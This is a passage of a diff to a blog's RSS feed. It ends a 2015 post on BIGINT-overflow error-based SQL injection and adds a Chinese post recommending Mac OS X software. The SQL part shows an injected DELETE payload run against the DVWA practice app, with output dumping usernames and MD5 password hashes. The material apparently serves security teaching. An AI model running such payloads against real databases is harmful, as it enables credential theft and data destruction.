+5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
+
+#delete:
+mysql&amp;gt; delete from users where user_id='1' or !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+1--admin--5f4dcc3b5aa765d61d8327deb882cf99
+2--gordonb--e99a18c428cb38d5f260853678922e03
+3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
+4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
+5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
+&lt;/code&gt;&lt;/pre&gt;
+</description>
 <pubDate>Mon, 10 Aug 2015 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2015/08/10/bigint-overflow-error-sqli.html</link>
 <guid isPermaLink="true">http://localhost:4000/2015/08/10/bigint-overflow-error-sqli.html</guid>
@@ -141,6 +2187,71 @@
 
 <item>
 <title>Mac OSX常用工具</title>
+<description>&lt;h1 id=&quot;mac-osx常用工具&quot;&gt;Mac OSX常用工具&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;30 Jul 2015 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;换Mac有几个月了，刚换的那个月折腾了整整一个月，初用OSX很不适应，这是一种错觉，就好比说了十几年汉语，突然说英语肯定很别扭，适应后就会觉得英语更加实用。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;life&quot;&gt;Life&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;weiboX(http://weiboformac.sinaapp.com/)这是个人开发的weibo for mac客户端&lt;/li&gt;
+  &lt;li&gt;微信(http://weixin.qq.com/cgi-bin/readtemplate?t=mac)微信的mac客户端，简单方便。&lt;/li&gt;
+  &lt;li&gt;Telegram Desktop(http://telegram.org/)简单轻便的IM客户端。&lt;/li&gt;
+  &lt;li&gt;网易云音乐(http://music.163.com/#/download)从QQMusic转到网易云音乐，蛮人性化的。&lt;/li&gt;
+  &lt;li&gt;MplayerX(http://www.macupdate.com/app/mac/33261/mplayerx)可以识别99%的视频格式，这就是我选它的理由。&lt;/li&gt;
+  &lt;li&gt;Skype(http://skype.gmw.cn/down/skype-for-computers.html)Skype视频聊天for mac&lt;/li&gt;
+  &lt;li&gt;Twitter(https://itunes.apple.com/us/app/twitter/id333903271)Twitter for mac&lt;/li&gt;
+  &lt;li&gt;Gitter(https://gitter.im/)Github组织IM客户端&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;coding&quot;&gt;Coding&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Sublime Text 3(http://www.sublimetext.com/3)平时写前端和做笔记用的范围大，配合一些插件也可以用做IDE。&lt;/li&gt;
+  &lt;li&gt;PhpStorm(http://www.jetbrains.com/phpstorm/whatsnew/)这个还是当初FireBroo表哥推荐给我的，PHP标配IDE，没有之一。&lt;/li&gt;
+  &lt;li&gt;PyCharm(http://www.jetbrains.com/pycharm/)Pyhon的IDE，一直在用它，毕竟JetBrains出品。&lt;/li&gt;
+  &lt;li&gt;Android Studio(http://developer.android.com/)Android开发环境，基于IntelliJ IDEA，一直用它审计Android反编译的源码也很不错的。&lt;/li&gt;
+  &lt;li&gt;MacVim(http://www.macupdate.com/app/mac/25988/macvim)Vim for mac这个我就不多说了。&lt;/li&gt;
+  &lt;li&gt;0xED(http://www.macupdate.com/app/mac/22750/0xed)编辑二进制文件用的小型文本处理工具。&lt;/li&gt;
+  &lt;li&gt;Dash(https://kapeli.com/dash)API文档浏览器，编程语言、框架、IDE、协议等官方文档全到没朋友。&lt;/li&gt;
+  &lt;li&gt;MAMP Pro(https://www.mamp.info)php开发组合，内置多版本php，我用的是3.2version。&lt;/li&gt;
+  &lt;li&gt;Navicat Premium(http://www.navicat.com.cn/download)数据库管理工具，可以管理MySQL、SQLite、Oracle 及 PostgreSQL等数据库。&lt;/li&gt;
+  &lt;li&gt;Mysql Workbench(http://dev.mysql.com/downloads/workbench/)平时用做Mysql ER/数据库建模，也可以代替PhpMyAdmin。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;efficient&quot;&gt;Efficient&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;iTerm2(http://www.iterm2.com/)mac的终端工具，osx内置的terminal还是不够人性化，再加上zsh堪称完美。&lt;/li&gt;
+  &lt;li&gt;HomeBrew(http://brew.sh/)最简单和灵活的方式，用来在 Mac OS X 安装 Linux 工具包。&lt;/li&gt;
+  &lt;li&gt;LastPass(https://lastpass.com/misc_download2.php)平时用做记录复杂密码的。&lt;/li&gt;
+  &lt;li&gt;Alfred 2(http://www.alfredapp.com/)mac下检索/搜索工具，可以根据自己的习惯定制搜索方案，完美替代osx内置的Spotlight。&lt;/li&gt;
+  &lt;li&gt;Mou(http://25.io/mou/)MarkDown编辑器，两栏界面，直观清爽，功能简洁到位，用过的都说好。&lt;/li&gt;
+  &lt;li&gt;BetterZip(http://www.betterzip.com/)解/压缩工具。&lt;/li&gt;
+  &lt;li&gt;iStat Menuns(https://bjango.com/mac/istatmenus/)可以在Finder菜单栏显示CPU使用率, 内存使用, 硬盘读写速度, 网络上传下载速率使用情况, 温度传感器温度等数据的软件。&lt;/li&gt;
+  &lt;li&gt;TeamViewer(https://www.teamviewer.com)远程协作，这就不多说了。&lt;/li&gt;
+  &lt;li&gt;Snagit(https://www.techsmith.com/download/snagit/)捕捉、编辑、共享您计算机屏幕上的一切对象。&lt;/li&gt;
+  &lt;li&gt;Hopper Disassembler(http://www.hopperapp.com/)Mac下的二进制反汇编工具。&lt;/li&gt;
+  &lt;li&gt;Parallels Desktop(http://www.parallels.com/uk/products/desktop/)mac下强大的虚拟机，不过vmware Fusion也蛮适用。&lt;/li&gt;
+  &lt;li&gt;CleanMyMac3(http://cleanmymac.com/)磁盘清理和系统优化软件，产品不错。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;thinking&quot;&gt;Thinking&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Evernote(https://www.yinxiang.com/download/)去年开始用印象笔记，剪切同步很方便，也可以用做团队协作。&lt;/li&gt;
+  &lt;li&gt;XMind(http://www.xmind.net/download/mac/)强大的绘画思维导图工具。&lt;/li&gt;
+  &lt;li&gt;yEd(http://www.yworks.com/en/products/yfiles/yed/)平时绘画流程图用。&lt;/li&gt;
+  &lt;li&gt;Balsamiq Mockups(http://balsamiq.com/)构建原型图工具。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;其他的细节就折腾折腾吧，也是一种乐趣。这里面一些软件是收费的，可以在网上找大家分享的注册码，程序员不好当，还是建议大家支持正版。&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
 <pubDate>Thu, 30 Jul 2015 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2015/07/30/mac-tools.html</link>
 <guid isPermaLink="true">http://localhost:4000/2015/07/30/mac-tools.html</guid>
